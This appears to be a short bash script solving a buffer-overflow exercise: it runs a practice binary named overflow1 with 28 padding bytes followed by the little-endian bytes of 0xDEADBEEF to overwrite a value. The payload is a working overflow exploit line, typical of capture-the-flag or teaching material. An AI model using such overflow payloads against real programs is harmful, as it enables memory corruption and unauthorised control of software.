#!/bin/bash

# Just overflow and get to offset with DEADBEEF filling the valu
./overflow1 `python -c "print 'A'*28+'\xef\xbe\xad\xde'"`
